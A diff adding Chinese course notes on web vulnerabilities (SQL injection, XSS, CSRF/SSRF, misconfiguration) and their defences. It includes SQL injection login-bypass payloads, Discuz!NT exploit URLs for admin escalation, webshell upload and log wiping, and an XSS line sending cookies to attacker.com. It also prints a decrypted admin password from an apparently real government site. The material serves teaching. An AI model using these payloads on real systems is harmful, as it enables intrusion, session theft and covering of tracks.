@@ -2985,6 +2985,849 @@ _605501f8.60550208.00000000.4aac22e0.4a564b70|(null)|
 
 <!-- tabs:end -->
 
+# Web应用程序漏洞
 
+## Web基础
 
+- [x] 目前普遍使用的Web三层架构
 
+<p align="center">
+  <img src="./img/改写任意位置内存.png"></img>
+</p>
+
+- [x] 一次Web访问过程分析
+
+<p align="center">
+  <img src="./img/一次Web访问过程分析.png"></img>
+</p>
+
+- [x] 软件Web化
+  - C/S(客户端/服务器端) → `B/S` (浏览器/服务器端)
+  - 云计算：SaaS(软件即服务)
+  - 浏览器即操作系统(例如ChromeOS)，浏览器即服务
+- [x] Web技术发展
+  - Web 1.0：信息共享(单向)
+  - Web 2.0：信息共建(交互)
+  - Web 3.0：知识传承(泛型数据库，即时性)
+  - Web 4.0：知识分配(物联网和人工智能)
+  - Web 5.0：虚拟社会。。。还有Web 6.0。。。
+- [x] 移动应用APP/小程序/快应用：模糊C/S和B/S
+
+### Web中间件
+
+- `Apache httpd` ：模块化的服务器，跨平台，API扩展
+- `Tomcat` ：是Sun的JSWDK(Java Server Web Development Kit)中Servlet的运行环境(servlet容器)，是Apache Jakarta软件组织的一个子项目。经过多年发展，Tomcat不仅是JSP和Servlet规范的标准实现，而且具备了很多商业Java Servlet容器的特性，并被一些企业用于商业用途
+- `JBoss` ：是一个运行EJB的J2EE应用服务器，开放源代码。已经发展成为一个基于J2EE的Web操作系统(operating 
+system for web)，体现了J2EE规范中最新的技术
+- `WebLogic` ：企业级的应用服务器，支持EJB、集群以及ERP(企业资源计划)的连通性，Oracle公司出品
+- `WebSphere` ：IBM公司一套典型的电子商务应用开发工具及运行环境
+
+### Web应用漏洞——整体观
+
+<p align="center">
+  <img src="./img/Web应用漏洞.png"></img>
+</p>
+
+### Apache Log4j2远程代码执行漏洞
+
+- [x] “2021年十大网络安全漏洞”之首：2021年12月9日，阿里云安全团队向apache报告，震撼业界
+- [x] Apache Log4j2是一个基于Java的<span style="color:blue;">日志记录框架</span>，开源，在企业、运营技术(OT)、软件即服务(SaaS)和云服
+务提供商(CSP) 环境中普遍使用
+- [x] Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，攻击者仅仅需要向目标服务器发送精心构造的恶意数据触发Log4j2组件解析缺陷，就<span style="color:blue;">可以实现目标服务器任意命令执行，获取目标服务器权限</span>
+- [x] 由于日志记录存在的普遍性，所以该漏洞具有<span style="color:blue;">危害程度高、利用难度低、影响范围大、后续影响广</span>的特点
+- [x] 漏洞涉及CVE编号：CVE-2021-44228
+
+## OWASP Top Ten 2021
+
+- [x] Top 10 Web Application Security Risks  https://owasp.org/Top10/
+- [x] https://owasp.org/Top10/zh_CN/
+
+### OWASP Top Ten 2021 VS. 2017
+
+<p align="center">
+  <img src="./img/OWASP2017.png"></img>
+</p>
+
+- [x] https://owasp.org/www-project-top-ten
+- [x] 新增加
+  - A04:2021-Insecure Design 不安全设计
+  - A08:2021-Software and Data Integrity Failures 软件及资料完整性失效
+  - A10:2021-Server-Side Request Forgery(SSRF) 服务器端请求伪造
+- [x] 合并或删除
+  - A04:2017-XML External Entities(XXE) XML外部实体
+  - A07:2017-Cross-Site Scripting(XSS) 跨站脚本
+  - A08:2017-Insecure Deserialization 不安全的反序列化
+
+#### OWASP Top Ten 2017
+
+<p align="center">
+  <img src="./img/OWASP20171.png"></img>
+  <img src="./img/OWASP20172.png"></img>
+</p>
+
+### Top 10应用程序安全风险因素
+
+<p align="center">
+  <img src="./img/10应用程序安全风险因素.png"></img>
+</p>
+
+## SQL注入漏洞
+
+### 注入漏洞
+
+- [x] <span style="color:red;">原理</span>：攻击者能够利用现有Web应用程序，<span style="color:blue;">将恶意代码当作数据插入查询语句或命令中</span>，这些恶意数据可以欺骗解析器，从而执行非授权操作
+- [x] <span style="color:red;">可利用性</span>：注入攻击漏洞往往是应用程序<span style="color:blue;">缺少对输入进行安全性检查</span>所引起的。几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务
+- [x] <span style="color:red;">普遍性</span>：注入漏洞十分普遍，注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现
+
+### SQL注入漏洞
+
+- [x] SQL注入漏洞是指，攻击者能够利用现有Web应用程序，<span style="color:blue;">将恶意的数据插入SQL查询中</span>，提交到后台数据库引擎<span style="color:blue;">执行非授权操作</span>
+- [x] SQL注入漏洞的主要危害：
+  - 非法<span style="color:blue;">查询、修改或删除</span>数据库资源
+  - <span style="color:blue;">执行</span>系统命令
+  - <span style="color:blue;">获取</span>承载主机操作系统和网络的访问权限
+- [x] SQL注入漏洞的风险较大：
+  - <span style="color:red;">具有广泛性</span>。所有基于SQL语言标准的<span style="color:blue;">数据库软件</span>(SQL Server/Oracle/MySQL/DB2等)以及与之连接的<span style="color:blue;">网络应用程序</span>(ASP/JSP/PHP/Perl等)都面临该类攻击
+  - <span style="color:red;">防范较困难</span>。SQL注入内容是<span style="color:blue;">正常输入的一部分</span>，较易绕过防火墙
+
+### SQL注入原理
+
+- [x] 正常登陆
+
+<p align="center">
+  <img src="./img/SQL注入原理.png"></img>
+</p>
+
+- <kbd style="color:green;">select * from member where UID =' " request.getPar..("ID") "  ' And 
+Passwd =' " request.getP..("Pwd")  " '</kbd>
+  - 若攻击者已知系统中已有一个Admin的管理者账号，则输入 <kbd style="color:darkcyan;">Admin '-- ，即可不须输入密码而进入数据库</kbd>
+  - <kbd style="color:plum">select * from member where UID =' Admin '-- '  And Passwd =' '</kbd>
+    > - 注:  <kbd style="color:red;">--</kbd> <span style="color:blue;">符号后的字符会被当作注释</span> ，因此上例中And子句将被SQL视为注释
+
+### SQL注入实例
+
+<p align="center">
+  <img src="./img/SQL注入实例.png"></img>
+</p>
+
+- [x] “万能密码”
+  - 1："or "a"="a
+  - 2：')or('a'='a
+  - 3：or 1=1
+  - 4：'or 1=1-
+  - 5：a'or' 1=1-
+  - 6："or 1=1-
+  - 7：'or'a'='a
+  - 8："or"="a'='a
+  - 9：'or''='
+  - 10：'or'='or‘
+
+#### SQL注入实例：某县中医院网站
+
+<p align="center">
+  <img src="./img/SQL注入实例1.png"></img>
+  <img src="./img/SQL注入实例2.png"></img>
+</p>
+
+### SQL注入的产生
+
+- [x] <span style="color:red;">动态字符串构建</span>
+  - 不正确的处理转义字符
+  - 不正确的处理类型
+  - 不正确的处理联合查询
+  - 不正确的处理错误
+  - 不正确的处理多次提交
+- [x] <span style="color:red;">不安全的数据库配置</span>
+  - 默认预先安装的用户
+  - 以root、SYSTEM或者Administrator权限系统用户来运行
+  - 默认允许很多系统函数(如xp_cmdshell, OPENROWSET等）
+
+### SQL注入的风险
+
+- [x] 数据表中的<span style="color:blue;">数据外泄</span>，例如个人机密数据、帐户数据、密码等
+- [x] <span style="color:blue;">数据结构</span>被黑客获取，得以做进一步攻击(例如 <kbd style="color:red;">SELECT * FROM sys.tables</kbd> )
+- [x] 数据库服务器攻击，系统管理员<span style="color:blue;">帐户篡改</span>(例如 <kbd style="color:red;">ALTER LOGIN sa WITH PASSWORD='xxxxxx'</kbd> )
+- [x] 取得系统较高权限后，有可能得以在<span style="color:blue;">网页加入恶意链接</span>以及XSS
+- [x] 经由数据库服务器提供的操作系统支持，让黑客得以修改或<span style="color:blue;">控制操作系统</span>(例如xp_cmdshell "net stop iisadmin"可停止服务器的IIS服务)
+
+### SQL注入的防护方法
+
+- [x] 代码级防护
+  - <span style="color:blue;">验证输入</span>
+  - 参数化SQL
+  - 输出检查
+  - 使用存储过程
+- [x] 平台级别防护
+  - 在运行期间防护： <span style="color:blue;">使用WAF(Web应用防火墙)、URL重写</span> 等
+  - 配置数据库安全策略(权限配置、关闭默认账号、审计等)
+
+### Sql注入类型
+
+- [x] 主要分为<span style="color:blue;">字符型注入和数字型注入</span>，由于编程语言不同，所存在的注入类型也不同
+- [x] SQL查询语句中，数据类型的语法有三种：
+  - <span style="color:blue;">数字型</span>： SELECT 列FROM 表WHERE <kbd style="color:red;">数字型列=值</kbd>
+  - <span style="color:blue;">字符型</span>： SELECT 列FROM 表WHERE <kbd style="color:red;">字符型列=’值’</kbd>
+  - <span style="color:blue;">搜索型</span>： SELECT * FROM 表WHERE where <kbd style="color:red;">被搜索的列like ‘%值%’</kbd>
+
+### Sql注入对于不同语言的表现
+
+<!-- tabs:start -->
+
+#### **Asp表现**
+
+- [x] 存在数字型和字符型注入
+  - (A) 数字型 字段=51
+    - <kbd style="color:red;">Select * from 表名 where 字段=51</kbd>
+    - 构造参数：<kbd style="color:red;">ID=49 And [查询条件]</kbd>
+    - 生成语句：<kbd style="color:red;">Select * from 表名where 字段=49 And [查询条件]</kbd>
+  - (B)字符型的另一种形式
+    - 搜索语句：<kbd style="color:red;">Select * from 表名where 字段like '%关键字%'</kbd>
+    - 构造参数：<kbd style="color:red;">keyword='and [查询条件] and '%25'='</kbd>
+    - 生成语句：<kbd style="color:red;">Select * from 表名where字段like '%' and [查询条件] and '%'='%'</kbd>
+ 
+- [x] Asp注入的预防
+  - 对于用户端输入的任意字符，包括GET提交、POST提交、Cookie提交、SERVER提交的都需要做严格过滤
+  - 对于数字型参数判断是否为数字：可用函数isNumeric来判断，返回值为true和false
+  - 对于字符型参数过滤单引号，使其无法闭合当前sql语句的单引号
+  - 例外：base64编码
+  - Sql通用防注入
+
+#### **Php表现**
+
+- [x] Php的魔术引号(magic_quotes_gpc) 
+  - <span style="color:red;">魔术引号是一个自动将进入PHP脚本的数据进行转义的过程</span>。当打开时，所有的'(单引号)，"(双引号)，\(反斜线)和NULL字符都会被自动加上一个反斜线进行转义
+  - php.ini-dist 默认是开启此功能。此时将不会产生字符型注入，主要是数字型注入
+- [x] 数字型注入：
+  - <kbd style="color:red;">select * from guess where id=“.$id.”</kbd>
+  - <kbd style="color:red;">select * from guess where id=$id</kbd>
+
+- [x] GPC不起作用的情况
+  - 数组
+    ```sql
+    $userid=$_POST[userid'];
+    for($i=0;$i<count($ userid);$i++){
+    $query=“select *  from user where i_hid='".$ userid[$i]."'";
+    ```
+  - 编码函数引起
+    - **base64_decode,base64编码后的单引号：Jw==**
+  - mysql处理GBK编码字符%bf%27导致单引号被绕过的问题
+  - 其他数据库，如ms sql。对于转义符反斜杠作为字符处理的。
+    ```sql
+    select * from test where title ='aaa\' or '1'='1‘
+    ```
+
+- [x] Php注入的预防
+  - `确认GPC开启` ，若没开启则用addslashes函数过滤之，如下代码。
+    ```sql
+    if (!get_magic_quotes_gpc()) {
+      $lastname = addslashes($_POST['lastname']);
+    } else {
+      $lastname = $_POST['lastname'];
+    }
+    ```
+  - 对于数字型参数可使用intval 或floatval 强制转换为数字型。
+  - 注意mysql的版本以及默认字符集，Mysql>4.1
+    - 字符集连接字符串:
+      ```sql
+      mysql_query("SET character_set_connection=$dbcharset,
+      character_set_results=$dbcharset, 
+      character_set_client=binary;")
+      ```
+  - Php5以上版本Mysqli扩展预防，参数化查询
+    ```sql
+    $city = "Amersfoort";
+    /* create a prepared statement */
+    $stmt = $mysqli->prepare("SELECT District FROM City 
+    WHERE Name=?")
+    $stmt->bind_param("s", $city);
+    $stmt->execute();
+    $stmt->bind_result($district);
+    $stmt->fetch();
+    printf("%s is in district %s\n", $city, $district);
+    $stmt->close();
+    ```
+
+#### **Jsp表现**
+
+- [x] 由于java语言是强类型语言，所有变量定义前必须声明其类型，因而仅存在字符型的注入
+- [x] 字符型注入实例：
+  ```sql
+  String sql = "select * from tb_name where name='"+varname+"' and passwd='"+varpasswd+"'";
+  stmt  =  conn.prepareStatement(sql);
+  ```
+- [x] 构造参数varpasswd值为： `' or '1' = '1`
+- [x] Sql语句经过解析后将是：
+  ```sql
+  select * from tb_name = '随意' and passwd = '' or '1' = '1';
+  ```
+- [x] Jsp预防
+  - 采用jdbc的prepareStatement查询数据库，并且sql语句中不出现参数，如：
+    ```sql
+    sqlStr = “select id from info where city=? and open=? order by id desc”;
+    stmt = conn.prepareStatement(sqlStr);
+    stmt.setString(1,city);
+    stmt.setString(2,var1);
+    ```
+
+#### **Asp.net表现**
+
+- [x] 开发语言常用的有：vb.net和C#,都属于强类型语言，因而只存在字符型注入。
+- [x] 注入原理，与asp的字符型注入一样。
+- [x] Asp.net注入预防
+  - 使用Ado.net的参数化查询。
+    ```sql
+    strSQL = "SELECT * FROM Orders WHERE CustomerID = @CustomerID";
+    SqlCommand cmd = new SqlCommand(strSQL, cn);//创建一个sqlcommand对象。
+    //创建新参数，参数绑定
+    cmd.Parameters.AddWithValue("@CustomerID", "ALFKI");
+    ```
+
+<!-- tabs:end -->
+
+### sql注入的检测简单流程
+
+<p align="center">
+  <img src="./img/sql注入的检测简单流程.png"></img>
+</p>
+
+### 一个SQL注入攻击的实例
+
+- [x] SQL注入
+  - 一般存在于http://xxx.xxx.xxx/abc.asp?id=XX等带有参数的动态网页
+  - 没有对外界输入进行必要的过滤
+- [x] 原理不赘述，以一个例子来说明
+
+#### SQL注入漏洞和攻击的例子
+
+- [x] Discuz!NT 2.5 showuser.aspx SQL注入漏洞
+  - http://www.educity.cn/labs/648627.html
+  - Discuz!NT 2_5_vuln.mht
+  - dnt_25_n2.zip
+  - webshell.asp.zip
+- [x] 运行平台
+  - Windows 2003 Server(自带IIS 6.0)
+  - SQL Server 2005
+  - Discuz!NT 2.5
+- [x] 漏洞起因
+  - 漏洞是由showuser.aspx文件引起的，该文件的作用是显示论坛的会员列表。由于脚本中对于用来用户排序的ordertype参数未经过滤而直接查询数据库，攻击者可以通过精心构造的ordertype参数进行数据库的写操作
+- [x] 漏洞出错提示
+
+<p align="center">
+  <img src="./img/漏洞出错提示.png"></img>
+</p>
+
+- [x] 漏洞触发路径
+
+<p align="center">
+  <img src="./img/漏洞触发路径.png"></img>
+</p>
+
+- [x] 漏洞代码分析
+
+<p align="center">
+  <img src="./img/漏洞代码分析.png"></img>
+</p>
+
+- [x] 漏洞修复分析
+
+<p align="center">
+  <img src="./img/漏洞代码分析1.png"></img>
+</p>
+
+- [x] 漏洞攻击步骤
+  - 新建一个普通用户账号infosec
+  - 将infosec提升为管理员权限
+    - http://localhost/showuser.aspx?ordertype=desc;update dnt_users set adminid='1',groupid='1' where username='infosec';-
+  - 更改上传格式：jpg →aspx
+    - http://localhost/showuser.aspx?ordertype=desc;update dnt_attachtypes set extension='aspx' where extension='jpg';-
+  - 通过附件上传网页木马
+  - 获得webshell
+  - 清除痕迹
+    - http://localhost/showuser.aspx?ordertype=desc;update dnt_attachtypes set extension='jpg' where extension='asp';-
+    - http://localhost/showuser.aspx?ordertype=desc;delete from dnt_adminvisitlog where username='hacker';-
+    - http://localhost/showuser.aspx?ordertype=desc;update dnt_users set adminid='',groupid='' where username='hacker';--
+
+- [x] 获得webshell
+
+<p align="center">
+  <img src="./img/获得webshell.png"></img>
+</p>
+
+### SQL盲注
+
+- `盲注` ：是SQL注入的一种。即在SQL注入过程中，SQL语句执行查询后，<span style="color:blue;">查询数据不能回显到前端页面中</span>，我们需要使用一些特殊的方式来判断或尝试，这个过程称为盲注
+- SQL盲注分为两类：
+  - `布尔盲注` ：布尔就是True或False，也就是说它只会根据你的注入信息返回 `True或False` ，没有了之前的报错信息
+  - `时间盲注` ：界面返回值只有一种True，无论输入任何值返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的 `时间差` 来判断注入的语句是否正确
+
+## XSS漏洞(跨站脚本攻击)
+
+- [x] 跨站脚本(Cross Site Script)，简称XSS，避免与层叠样式表(Cascading Style Sheets, CSS)混淆
+- [x] 漏洞原理：XSS漏洞是指，应用程序<span style="color:red;">没有</span>对接收到的<span style="color:blue;">不可信数据</span>经过<span style="color:red;">适当的验证或转义</span>就直接发给<span style="color:blue;">客户端浏览器</span>。XSS是脚本代码注入的一种
+- [x] Web浏览器可以执行HTML页面中嵌入的脚本命令，支持多种脚本语言(如JavaScript、VBScript和ActiveX等)。攻击者利用XSS漏洞将恶意脚本代码注入到网页中，<span style="color:blue;">当用户浏览该网页时，便会触发执行恶意脚本</span>
+
+### XSS攻击的原理
+
+- [x] 不同于大多数攻击一般只涉及攻击者和受害者，<span style="color:red;">XSS往往涉及到三方</span>，即<span style="color:blue;">攻击者、被攻击者利用的网站、受害者客户端</span>
+
+<p align="center">
+  <img src="./img/XSS攻击的原理.png"></img>
+</p>
+
+### XSS攻击的分类
+
+<!-- tabs:start -->
+
+#### **反射型(Reflected XSS)**
+
+- 攻击者通过特定手法，<span style="color:blue;">诱使</span>用户去访问<span style="color:blue;">一个包含恶意代码的URL</span>
+- 当受害者点击这些专门设计的链接的时候，<span style="color:blue;">恶意代码会直接在受害者主机上的浏览器执行</span>
+- 此类XSS攻击通常出现在网站的搜索栏、用户登录口等地方，常用来<span style="color:blue;">窃取客户端Cookies</span>或进行<span style="color:blue;">钓鱼欺骗</span>
+
+<p align="center">
+  <img src="./img/反射型.png"></img>
+</p>
+
+#### **存储型(Stored XSS)**
+
+- 攻击者<span style="color:blue;">事先将恶意代码上传或者储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码</span>
+- 这意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此<span style="color:blue;">存储型XSS攻击的危害会更大</span>
+- 此类攻击一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中
+
+<p align="center">
+  <img src="./img/存储型.png"></img>
+</p>
+
+#### **反射型vs. 存储型**
+
+<p align="center">
+  <img src="./img/存储型1.png"></img>
+</p>
+
+#### **基于DOM型(DOM-based XSS)**
+
+- [x] 文档对象模型(Document Object Model)，是W3C组织推荐的处理可扩展置标语言的标准编程接口。它是一种与平台和语言无关的应用程序接口(API)，可以<span style="color:blue;">动态地访问程序和脚本，更新其内容</span>、结构和www文档的风格(HTML和XML文档是通过说明部分定义的)
+
+<p align="center">
+  <img src="./img/基于DOM型.png"></img>
+  <img src="./img/基于DOM型1.png"></img>
+</p>
+
+- [x] 构造XSS代码， `修改参数` ，成功执行脚本
+
+<p align="center">
+  <img src="./img/基于DOM型2.png"></img>
+</p>
+
+- [x] <span style="color:blue;">客户端的脚本程序可以动态地检查和修改页面内容</span>，而<span style="color:blue;">不依赖于服务器端的数据</span>
+- [x] 例如客户端如<span style="color:blue;">从URL中提取数据并在本地执行</span>，如果用户在客户端输入的数据包含了恶意的JavaScript脚本，而这些脚本没有经过适当的过滤或者消毒，那么应用程序就可能受到DOM-based型XSS攻击
+- [x] 需要特别注意以下的用户输入源document.URL、location.hash、location.search、document.referrer等
+
+<p align="center">
+  <img src="./img/基于DOM型3.png"></img>
+</p>
+
+<!-- tabs:end -->
+
+### XSS跨站脚本攻击实例
+
+- [x] 解释：当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送 给一个网页浏览器，这就会产生跨站脚本攻击(简称XSS)。
+- [x] XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站、或者将用户转向至恶意网站。
+  - <kbd style="color:red;">'><script>document.location='http://attacker.com/index.php?foo='+document.cookie</script><!--</kbd>这导致受害者的会话ID被发送到攻击者的网站，使得攻击者能够劫持用户当前会话。
+
+### XSS风险
+
+- [x] 盗取各类用户帐号，如网银、管理员等帐号
+- [x] 欺骗浏览器访问钓鱼网站，以骗取账号密码等个人信息
+- [x] 将使用者浏览器导向恶意网站，向使用者计算机下载并安装恶意后门程序
+
+### XSS的防护方法
+
+- `输入验证` ：某个数据被接受为可被显示或存储之前，使用标准输入验证机制，验证所有输入数据的长度、类型、语法以及业务规则
+- `强壮的输出编码` ：数据输出前，确保用户提交的数据已被正确进行entity编码(\&amp; \&lt; \&gt; \&quot;)，建议对所有字符进行编码而不仅局限于某个子集
+- `明确指定输出的编码方式`(如ISO 8859-1或UTF 8)：不要允许攻击者为你的用户选择编码方式
+- 将『<』、『>』、『%』、『/』、『()』、『&』等 `符号进行过滤不予输出至网页` ，或限定字段长度的输入；并注意黑名单验证方式的局限性：仅仅查找或替换一些字符(如"<" ">"或类似"script"的关键字)，很容易被XSS变种攻击绕过验证机制
+- `对用户输入数据编码` ：
+  - Asp:server.htmlencode函数
+  - Php:htmlspecialchars函数
+  - asp.net:HttpContext.Current.Server.HtmlEncode
+  - jsp:默认没有提供过滤方法，需要自写方法。
+- `过滤危险的html关键字符` ：
+  - 比如：script/iframe等。
+
+### XSS检测
+
+- 搜索关键字
+  - Asp:request/
+  - Php:$_GET/$_POST/$_COOKIE/$_SERVER
+  - Jsp：request.getParameter/request.getCookies
+  - Asp.net:Request.QueryString/Form/Cookies/SeverVaiables/
+
+## CSRF和SSRF漏洞
+
+### CSRF(跨站请求伪造)
+
+- [x] Cross-Site Request Forgery 
+  - 也被称成为“one click attack”或者session riding，通常缩写为CSRF
+  - 是一种<span style="color:blue;">挟制终端用户在当前已登录的Web应用程序上执行非本意的操作</span>的攻击方法
+  - 攻击者只要借助少许的社会工程诡计，例如通过电子邮件或者是聊天软件发送的链接，攻击者就能迫使一个Web应用程序的用户去执行攻击者选择的操作
+
+#### CSRF原理
+
+- [x] CSRF攻击的关键因素
+  - <span style="color:red;">HTTP协议无连接</span>，WEB服务器与浏览器间的<span style="color:blue;">状态通过Session ID、Cookie等关联</span>
+  - 攻击者的目标站点具有持久化授权cookie或者受害者具有当前<span style="color:blue;">会话凭证</span>(如Session cookie等)
+  - 大部分情况下浏览器在每次向服务器请求时<span style="color:blue;">自动提交认证凭证</span>(包括Session cookie、Basic authentication header、IP地址、客户侧SSL证书和Windows域认证)在执行关键操作时，没有对用户进行再次确认
+- [x] 与XSS区别
+  - XSS基于Web网站的漏洞和客户端对网站的信任，<span style="color:blue;">利用客户端窃取cookie等</span>
+  - CSRF基于站点对已认证用户的信任，<span style="color:blue;">实现对网站的利用</span>
+
+<p align="center">
+  <img src="./img/CSRF原理.png"></img>
+  <img src="./img/CSRF原理1.png"></img>
+  <img src="./img/CSRF原理2.png"></img>
+</p>
+
+#### CSRF风险
+
+- 执行网站会话(转账、登出)
+- 访问敏感数据(读取、篡改、添加、删除企业、个人敏感数据)
+- 修改账户信息
+
+#### CSRF的防护方法
+
+- 用户
+  - 使用Web应用程序之后立即登出
+  - **不要让浏览器保存用户名/口令**
+  - 不要使用同一个浏览器同时访问敏感的应用程序和随意冲浪
+- 开发者
+  - 将持久化的授权方法(例如cookie或者HTTP授权)切换为瞬时的授权方法(在每个form中提供隐藏field)
+  - 在non-GET请求中使用Security token
+  - 不要滥用$_REQUEST类变量
+
+### SSRF(服务器端请求伪造)
+
+- [x] SSRF(Server-Side Request Forgery， `服务器端` 请求伪造)
+- [x] SSRF是一种由攻击者构造请求，<span style="color:blue;">由服务器端发起请求的安全漏洞</span>，本质上是属于信息泄露漏洞
+- [x] 一般情况下，SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息(正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)
+- [x] 攻击者想访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因，导致<span style="color:blue;">攻击者无法直接访问主机B</span>
+- [x] 而<span style="color:blue;">服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息</span>
+
+<p align="center">
+  <img src="./img/SSRF.png"></img>
+</p>
+
+- [x] 很多web应用都提供了从其他的服务器上获取数据的功能(百度识图，给出一串URL就能识别出图片)。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器
+- [x] SSRF形成的原因大都是由于<span style="color:blue;">服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</span>。比如从指定URL地址获取网页文本内容、加载指定地址的图片、下载等
+- [x] CSRF vs. SSRF
+  - CSRF是跨站请求伪造攻击，由 `客户端发起`
+  - SSRF是服务器端请求伪造，由 `服务器发起`
+
+#### SSRF漏洞的防御
+
+- `过滤返回信息` ，验证远程服务器对请求的相应，是比较容易的方法。如果Web应用获取某种类型的文件，那么可以在把返回结果展示给用户之前先验证返回信息是否符合标准
+- `统一错误信息` ，避免用户根据错误信息来判断远程服务器端口状态
+- `限制请求的端口` 为HTTP常用端口，比如80、443、8080、8090
+- `黑名单内网IP` ，避免应用被用来获取内网数据，攻击内网
+- `禁用不需要的协议` 。仅仅允许HTTP 和HTTPS 请求。可以防止类似于file:// 、 gopher:// 和 ftp:// 等引起的问题
+
+## 其他Web漏洞
+
+### 失效的身份认证和会话管理
+
+- [x] 解释：与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、密匙、会话令牌或攻击其他的漏洞去冒充其他用户的身份。
+  - 1、未进行登录失败处理导致密码可暴力破解
+  - 2、任意密码重置
+
+### 功能级访问控制缺失
+
+- [x] 解释：这种漏洞允许攻击者访问未经授权的功能。管理性的功能是这类攻击的主要目标。
+  - 表现在：越权操作
+
+### 安全配置错误
+
+- [x] 解释：好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于<span style="color:blue;">许多设置的默认值并不是安全</span>的，因此，必须定义、实施和维护这些设置。这包含了对所有的<span style="color:blue;">软件保持及时地更新</span>，包括所有应用程序的库文件。
+- [x] 攻击案例
+
+<!-- tabs:start -->
+
+#### **案例1**
+
+- [x] 应用程序服务器<span style="color:blue;">管理员控制台自动安装后没有被删除</span>。而<span style="color:blue;">默认帐户也没有被改变</span>。攻击者在你的服务器上发现了标准的管理员页面，通过默认密码登录，从而接管了你的服务器。
+- [x] CVE-2009-3548
+  - 受该漏洞影响的Tomcat版本如果在安装时不更改，那么<span style="color:blue;">Tomcat默认会建立一个名为“admin”、密码为空的具有管理权限的账号</span>
+
+<p align="center">
+  <img src="./img/安全配置错误1.png"></img>
+</p>
+
+#### **案例2**
+
+- [x] <span style="color:blue;">目录列表</span>在你的服务器上<span style="color:blue;">未被禁用</span>。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到登录的配置文件，拿到账户信息。
+
+<p align="center">
+  <img src="./img/安全配置错误2.png"></img>
+</p>
+
+#### **案例3**
+
+- [x] 应用服务器配置<span style="color:blue;">允许堆栈跟踪返回给用户</span>，这样就暴露了潜在的漏洞。攻击者热衷于收集<span style="color:blue;">错误消息里供的额外信息</span>。
+
+<p align="center">
+  <img src="./img/安全配置错误3.png"></img>
+</p>
+
+<!-- tabs:end -->
+
+### Web漏洞：某省地震局网站
+
+<p align="center">
+  <img src="./img/Web漏洞.png"></img>
+  <img src="./img/Web漏洞1.png"></img>
+</p>
+
+#### PhpMyAdmin远程登录数据库
+
+- [x] 典型弱密码
+- [x] 用户名和密码都是root
+
+<p align="center">
+  <img src="./img/PhpMyAdmin远程登录数据库.png"></img>
+</p>
+
+#### 查看用户名密码
+
+<p align="center">
+  <img src="./img/查看用户名密码.png"></img>
+</p>
+
+#### 查看弱密码
+
+<p align="center">
+  <img src="./img/查看弱密码.png"></img>
+</p>
+
+#### 测试弱密码
+
+<p align="center">
+  <img src="./img/测试弱密码.png"></img>
+</p>
+
+#### 测试成功
+
+<p align="center">
+  <img src="./img/测试成功.png"></img>
+</p>
+
+### 破译加解密算法
+
+- [x] 明文：123      密文：4e4d4c
+- [x] 设明文是m，密文是c
+  - m:  1 - 49   2 - 50   3 - 51
+  - c : 4e - 78  4d - 77  4c - 76
+- [x] 猜测：ASCII码转换+线性算法
+  - 设解密算法是m = ac + b，代入值求解，计算出a = -1; b = 127，即解密算法：m = 127 – c
+- [x] admin密码的密文：4a4f495a562107070507
+- [x] 依次进行解密
+  - c:  4a - 74  4f - 79  49 - 73   5a - 90
+  - m:  53 - 5   48 - 0   54 - 6    37 - %
+- [x] admin密码明文：506%)^xxzx
+
+### 用系统管理员帐号登陆后台(略)
+
+### 使用含有已知漏洞的组件
+
+- [x] 解释：<span style="color:red;">组件</span>，比如：库文件、框架和其它软件模块，几乎总是<span style="color:red;">以全部的权限运行</span>。如果一个<span style="color:red;">带有漏洞的组件被利用</span>，这种攻击可以造成更为严重的数据丢失或服务器接管。应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，并使一系列可能的攻击和影响成为可能。
+  - JAVA反序列化
+    - 利用Apache Commons Collections这个常用的Java库来实现任意代码执行
+    - 影响：Jboss(WildFly)、Weblogic、WebSphere
+  - CVE-2016-1019 Adobe flash player 漏洞有可能允许攻击者获得此系统的最高控制权
+  - CVE-2016-0785  struts2远程代码执行漏洞
+
+### 未验证的重定向和转发
+
+- 解释：Web应用程序经常将用户重定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面。如果<span style="color:red;">没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站，或者使用转发去访问未授权的页面</span>。
+- 被恶意攻击者用来进行钓鱼攻击，将用户重定向到一个恶意的非法网站，执行攻击并安装恶意文件。
+
+### 敏感信息泄露
+
+- [x] 解释：常见的漏洞是 <span style="color:red;">应该加密的数据不进行加密</span>。在使用加密的情况下，常见的问题是不安全的密钥生成和管理和使用弱算法是很普遍的，特别是 <span style="color:red;">使用弱的哈希算法来保护密码</span>。
+  - 1、CVE-2014-0160 OpenSSL 心脏出血 攻击者一次可获得服务器上64K内存中的数据内容
+  - 2、CVE-2015-3152 MySQL SSL/TLS连接存在安全漏洞，可遭中间人攻击
+
+### OpenSSL的SM2缓冲区溢出漏洞
+
+- [x] OpenSSL 维护者在2021年8月24日发布了安全提示，披露了代号为CVE-2021-3711 和CVE-20213712 的两个漏洞
